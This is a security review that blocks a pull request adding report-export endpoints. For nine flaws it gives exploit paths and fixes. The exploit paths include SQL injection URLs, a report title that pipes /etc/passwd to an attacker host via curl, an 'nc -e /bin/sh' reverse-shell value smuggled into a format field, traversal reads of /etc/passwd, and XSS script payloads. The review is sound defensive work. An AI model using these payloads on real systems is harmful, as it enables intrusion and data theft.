# Security review: file-export endpoints

Scope: `routes/export.js` and `client/report.js` from the "document export" PR.

The "it's behind SSO/VPN, only employees use it" framing does not neutralize any of the findings below. Every finding is exploitable by *any single authenticated employee* (or by anything running in their browser), which is exactly the population that reaches this router. Internal-only is a blast-radius argument, not an authorization control.

---

## Findings

### 1. SQL injection in the export query — CRITICAL
- **Location:** `routes/export.js:17`
- **Vuln:** `req.params.id` is interpolated straight into the SQL string: `` `SELECT * FROM reports WHERE id = ${id}` ``. No parameterization, no cast. (Note the preview endpoint on line 40 does it correctly with `$1` — this one just wasn't.)
- **Exploit path:** The route param is not constrained to be numeric, so an attacker sends:
  ```
  POST /api/reports/0%20OR%201%3D1%20LIMIT%201/export
  ```
  which makes the query `... WHERE id = 0 OR 1=1 LIMIT 1` and returns someone else's report. Escalate to full data exfiltration with a UNION, reading any table the DB role can see:
  ```
  POST /api/reports/0%20UNION%20SELECT%20id,owner_id,title,body%20FROM%20reports--/export
  ```
  or dump credentials/other tables (`UNION SELECT ... FROM users`). Because the selected `body`/`title` then flow into the shell command (finding 3) and the output filename, this is also a pivot, not just a read.
- **Fix:** Use a parameterized query and validate the type:
  ```js
  const r = await db.query('SELECT * FROM reports WHERE id = $1', [id]);
  ```
  Ideally also `Number.isInteger(Number(id))` guard / route constraint `:id(\\d+)`.

### 2. OS command injection via `execSync` — CRITICAL
- **Location:** `routes/export.js:26` (built from `outPath` on line 22 and `format` on line 16)
- **Vuln:** `execSync` runs a shell string that includes `outPath`, which is derived from `report.title` and `req.body.format` — both attacker-controllable — with no escaping. `report.title` is user-authored content, and via finding 1 the attacker can even make the query return a `title`/`body` of their choosing.
- **Exploit path:** Attacker creates/saves a report whose **title** is:
  ```
  x" ; curl http://attacker/$(cat /etc/passwd | base64) ; echo "
  ```
  Then calls `POST /api/reports/:id/export` with `format: "pdf"`. `outPath` becomes `/var/app/exports/x" ; curl ... ; echo ".pdf`, and the double-quote in the title closes pandoc's `-o "..."` and injects arbitrary shell. Alternatively the `format` field itself: `{"format":"pdf; nc -e /bin/sh attacker 4444 #"}` lands unquoted after the filename. Result: remote code execution as the app user.
- **Fix:** Do not build a shell string. Use `execFileSync('pandoc', ['/tmp/in.md', '-o', outPath, '--token', PANDOC_TOKEN])` (argv form, no shell). Independently validate `format` against an allowlist (`['pdf','html','docx']`) and derive `outName` from a server-generated id, not the title (see finding 4).

### 3. Broken access control — export has no ownership check (IDOR) — HIGH
- **Location:** `routes/export.js:14–19`
- **Vuln:** `requireLogin` only proves the session is authenticated; it does not check that `report.owner_id === req.user.id`. The handler fetches and processes any report by id.
- **Exploit path:** Logged-in user A enumerates ids: `POST /api/reports/123/export` for reports they do not own, then downloads the rendered output (finding 5). Straight horizontal privilege escalation / data theft of other users' reports.
- **Fix:** After fetching, enforce `if (report.owner_id !== req.user.id && req.user.role !== 'admin') return res.status(403).send('forbidden');` — or better, scope the query: `WHERE id = $1 AND owner_id = $2`.

### 4. Path traversal on write via report title/format (arbitrary file write) — HIGH
- **Location:** `routes/export.js:21–22`
- **Vuln:** `outName = `${report.title}.${format}`` then `path.join(EXPORT_DIR, outName)`. `path.join` resolves `..`, so a title/format containing `../` escapes `EXPORT_DIR`, and pandoc writes an attacker-influenced file to an attacker-chosen path.
- **Exploit path:** Report title `../../var/app/current/public/shell` with `format: "html"` (and a `body` of attacker HTML/JS) writes `/var/app/current/public/shell.html` outside the export dir — plant a web-served file, overwrite app assets, or drop a cron/startup file depending on perms. Even without RCE this corrupts arbitrary paths the app user can write.
- **Fix:** Never derive filesystem paths from user text. Generate a random/opaque id for the on-disk name (`${crypto.randomUUID()}.${safeFormat}`), keep the human title only in a DB row, and validate the resolved path stays inside `EXPORT_DIR` (`path.resolve(...).startsWith(EXPORT_DIR + path.sep)`).

### 5. Path traversal on read in `/download` (arbitrary file disclosure) — HIGH
- **Location:** `routes/export.js:32–35`
- **Vuln:** `name` comes from `req.query` and is passed to `path.join(EXPORT_DIR, name)` → `res.sendFile` with no containment check and no ownership check.
- **Exploit path:**
  ```
  GET /api/download?name=../../../../etc/passwd
  ```
  returns the file. `res.sendFile` with an absolute traversal path reads anything the app user can (`.env`, DB config, other users' exports, SSH keys). Also note there is no association between the downloader and the file, so even without traversal any user can grab any other user's export by guessing/knowing the name.
- **Fix:** Reject any `name` containing path separators / `..`; resolve and verify the final path is inside `EXPORT_DIR`; and tie downloads to ownership — store exports in a table keyed by a random download id + `owner_id`, look that up instead of trusting a filename. Use `res.sendFile(name, { root: EXPORT_DIR })` with a validated basename.

### 6. Broken access control — "admin-only" preview enforced only in the client — HIGH
- **Location:** `routes/export.js:38–42` (server) vs `client/report.js:2` (client)
- **Vuln:** The comment says "Admin-only," but the server route has **no role check** — it runs under `requireLogin` like everything else. The only gate is `if (currentUser.role !== 'admin') hidePreviewButton()` in the browser, which is trivially bypassed. It also has no owner check, so it exposes *every* report's raw body.
- **Exploit path:** Any authenticated non-admin simply calls the endpoint directly, bypassing the hidden button entirely:
  ```
  GET /api/reports/999/preview
  ```
  and reads any report body in the system. Client-side hiding is not authorization.
- **Fix:** Enforce on the server: `if (req.user.role !== 'admin') return res.status(403).send('forbidden');` at the top of the handler. (Keep the client hint as UX, but the server check is what matters.)

### 7. Stored XSS in preview response — HIGH
- **Location:** `routes/export.js:42`
- **Vuln:** `res.send(`<div class="report">${r.rows[0].body}</div>`)` injects user-authored `body` into an HTML document with no escaping and no `Content-Type`/CSP guard. Reports are user content.
- **Exploit path:** Attacker saves a report whose body is `<script>fetch('/api/admin/...').then(...)</script>` or `<img src=x onerror="...">`. When an admin previews it (the intended reviewer of arbitrary reports), the script runs in the admin's authenticated session — session/CSRF-token theft, actions as admin. This chains with finding 6 (anyone can hit preview) to make delivery trivial.
- **Fix:** HTML-escape `body` before interpolation (or render markdown through a sanitizer such as DOMPurify server-side). Set `Content-Type: text/html; charset=utf-8` explicitly and add a restrictive `Content-Security-Policy` so inline scripts can't execute.

### 8. Hardcoded pandoc license secret in source — MEDIUM
- **Location:** `routes/export.js:9`
- **Vuln:** `PANDOC_TOKEN = 'pk_live_8f3a1c9d2b4e6f70'` is a live credential committed to the repo. Anyone with source access (and, via findings 1/2/5, potentially remote attackers reading the file) obtains it. Live secrets in VCS also persist in git history after removal.
- **Exploit path:** Any repo reader, CI log, or file-disclosure bug (finding 5: `GET /api/download?name=../../app/routes/export.js`) leaks the token; attacker reuses it against pandoc cloud, incurring cost / abuse under your account.
- **Fix:** Move to an env var / secrets manager (`process.env.PANDOC_TOKEN`), rotate the exposed key immediately, and scrub it from git history.

### 9. Fixed `/tmp/in.md` scratch path — race + local tampering — LOW
- **Location:** `routes/export.js:25`
- **Vuln:** All exports write the same `/tmp/in.md`. Concurrent requests clobber each other (one user's body rendered into another's export — an integrity/info-leak bug under load), and a predictable world-known temp path invites a local symlink/TOCTOU swap on a shared host.
- **Fix:** Use a unique temp file per request (`fs.mkdtempSync` / `os.tmpdir()` + random name) and clean it up.

---

## Verdict

**BLOCKED** — three independently exploitable critical/high issues (SQL injection, command-injection RCE, arbitrary file read/write) plus server-side-missing authorization on both endpoints and stored XSS. Not shippable; needs a real fix pass and re-review.
